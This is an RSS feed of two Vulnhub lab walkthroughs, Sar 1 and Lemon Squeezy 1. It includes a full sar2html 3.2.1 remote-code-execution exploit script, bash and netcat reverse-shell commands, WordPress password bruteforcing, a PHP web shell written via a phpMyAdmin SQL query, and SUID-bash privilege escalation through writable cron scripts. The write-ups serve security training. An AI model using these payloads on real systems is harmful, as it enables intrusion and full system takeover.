<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cron on</title><link>https://blog.ikuamike.io/tags/cron/</link><description>Recent content in Cron on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 13 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/cron/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Sar 1</title><link>https://blog.ikuamike.io/posts/2021/sar1/</link><pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/sar1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/sar1/sar1.png" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>15 Feb 2020&lt;/td>
&lt;td>Love&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this box there&amp;rsquo;s only one port open that is running a vulnerable version of sar2html that
we take advantage of to get a low priv shell. For privilege escalation there was a cron job
running as root that was running a script we could write in.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.107
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.000040s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">65534&lt;/span> closed ports
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAC Address: 08:00:27:48:00:F5 &lt;span style="color:#f92672">(&lt;/span>Oracle VirtualBox virtual NIC&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
&lt;p>Using nmap scripts we see the existence of robots.txt&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.107
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00042s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-enum:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /robots.txt: Robots file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ /phpinfo.php: Possible information file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From this we discover sar2HTML.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-01.png" class="center" style="border-radius: 8px;" />
&lt;p>Visiting this directory I get the version of sar2html as 3.2.1.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-02.png" class="center" style="border-radius: 8px;" />
&lt;p>Checking on searchsploit, a remote command execution vulnerability exists for this version.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>searchsploit sar2html
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-03.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-user">Shell as user&lt;/h1>
&lt;p>By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.&lt;/p>
&lt;p>script url: &lt;a href="https://www.exploit-db.com/exploits/49344" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49344&lt;/a>
&lt;/p>
&lt;pre tabindex="0">&lt;code>~/Vulnhub/Sar1 î‚° python3 49344.py
Enter The url =&amp;gt; http://192.168.56.107/sar2HTML/
Command =&amp;gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Command =&amp;gt; /bin/bash+-c+&amp;#39;/bin/bash+-i+&amp;gt;%26+/dev/tcp/192.168.56.1/9000+0&amp;gt;%261&amp;#39;
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-04.png" class="center" style="border-radius: 8px;" />
&lt;p>Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
I found a cron job running as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-05.png" class="center" style="border-radius: 8px;" />
&lt;p>While we can&amp;rsquo;t write to this file, the script being executed inside it is writeable.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-06.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
&lt;p>By writing into write.sh using vi, we can escalate our privileges.&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/bin/sh
cp /bin/bash /var/www/html/suidbash
chmod u+s /var/www/html/suidbash
&lt;/code>&lt;/pre>&lt;p>This will create a copy of the bash binary and add suid permissions to it.&lt;/p>
&lt;p>Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-07.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;p>Understanding the exploit script and perform the exploit manually.&lt;/p>
&lt;p>To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Exploit Title: sar2html 3.2.1 - &amp;#39;plot&amp;#39; Remote Code Execution&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Date: 27-12-2020&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Exploit Author: Musyoka Ian&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Vendor Homepage:https://github.com/cemtan/sar2html&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Software Link: https://sourceforge.net/projects/sar2html/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Version: 3.2.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Tested on: Ubuntu 18.04.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> re
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cmd &lt;span style="color:#f92672">import&lt;/span> Cmd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Enter The url =&amp;gt; &amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Terminal&lt;/span>(Cmd):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> prompt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Command =&amp;gt; &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">default&lt;/span>(self, args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exploiter(args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">exploiter&lt;/span>(cmd):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> url
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sess &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>session()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output &lt;span style="color:#f92672">=&lt;/span> sess&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>url&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/index.php?plot=;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>cmd&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> out &lt;span style="color:#f92672">=&lt;/span> re&lt;span style="color:#f92672">.&lt;/span>findall(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;option value=(.*?)&amp;gt;&amp;#34;&lt;/span>, output&lt;span style="color:#f92672">.&lt;/span>text)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (&lt;span style="color:#e6db74">&amp;#34;Error!!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ouut &lt;span style="color:#f92672">in&lt;/span> out:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;There is no defined host...&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;null selected&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;selected&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> ouut:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (ouut)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print ()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminal &lt;span style="color:#f92672">=&lt;/span> Terminal()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terminal&lt;span style="color:#f92672">.&lt;/span>cmdloop()&lt;span style="color:#f92672">%&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>According to the script the vulnerable parameter is plot and simply takes in our command and executes it.&lt;/p>
&lt;p>When interacting with the application you can select OS, when you pick one the plot parameter is used.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-08.png" class="center" style="border-radius: 8px;" />
&lt;p>Here we can inject the command we want and execute shell commands. The OS option doesn&amp;rsquo;t matter, anything after
the semi-colon &lt;code>;&lt;/code> will be executed. For the reverse shell command remember to url encode special chars like I did
above&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/sar1/sar1-09.png" class="center" style="border-radius: 8px;" />
&lt;p>Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.&lt;/p>
&lt;p>&lt;a href="https://musyokaian.medium.com/" target="_blank" rel="noopener">https://musyokaian.medium.com/&lt;/a>
&lt;/p></content></item><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>26 Apr 2020&lt;/td>
&lt;td>James Hay&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
script.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Debian Default Page: It works
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
&lt;p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p>
&lt;p>After performing a directory bruteforce using ffuf we get the following directories:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png" class="center" style="border-radius: 8px;" />
&lt;p>Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png" class="center" style="border-radius: 8px;" />
&lt;p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png" class="center" style="border-radius: 8px;" />
&lt;p>Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png" class="center" style="border-radius: 8px;" />
&lt;p>After logging into wordpress with the discovered credentials &lt;strong>orange:ginger&lt;/strong>, we find another password in drafts.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png" class="center" style="border-radius: 8px;" />
&lt;p>With this password, we are able to login to phpmyadmin as the orange user.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png" class="center" style="border-radius: 8px;" />
&lt;p>Successful login:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png" class="center" style="border-radius: 8px;" />
&lt;p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then verify that we have successful command execution, by running the whoami command.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
&lt;p>Running the below curl command we are able to get a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png" class="center" style="border-radius: 8px;" />
&lt;p>After performing some manual local enumeration, we discover a cron job running as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png" class="center" style="border-radius: 8px;" />
&lt;p>The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-root">Shell as root&lt;/h1>
&lt;p>After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod u+s /suidbash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png" class="center" style="border-radius: 8px;" />
&lt;p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./suidbash -p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;ul>
&lt;li>It seems I forgot user.txt and it is in /var/www.&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png" class="center" style="border-radius: 8px;" />
&lt;ul>
&lt;li>We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li>
&lt;/ul>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png" class="center" style="border-radius: 8px;" /></content></item></channel></rss>